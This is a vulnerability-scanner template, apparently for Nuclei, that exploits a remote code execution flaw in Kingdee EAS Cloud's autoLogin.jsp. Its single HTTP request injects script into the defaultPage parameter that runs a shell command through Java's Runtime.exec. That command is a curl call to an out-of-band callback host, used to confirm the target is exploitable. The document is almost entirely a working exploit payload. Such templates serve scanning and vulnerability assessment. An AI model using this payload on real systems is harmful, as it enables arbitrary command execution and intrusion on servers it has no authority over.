id: Kingdee-EAS-Cloud-autoLogin-rce
info:
  name: Kingdee-EAS-Cloud-autoLogin-rce
  author: lemonlove7
  severity: critical
http:
  - raw:
      - |-
        POST /easportal/autoLogin.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
         
        defaultPage=/autoLogin.jsp?defaultPage=/BIReport&json=1);var cc=new Array('/bin.sh','-c','curl {{interactsh-url}}');java.lang.Runtime.getRuntime().exec(cc);//
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: interactsh_protocol
        words:
          - dns
    matchers-condition: and
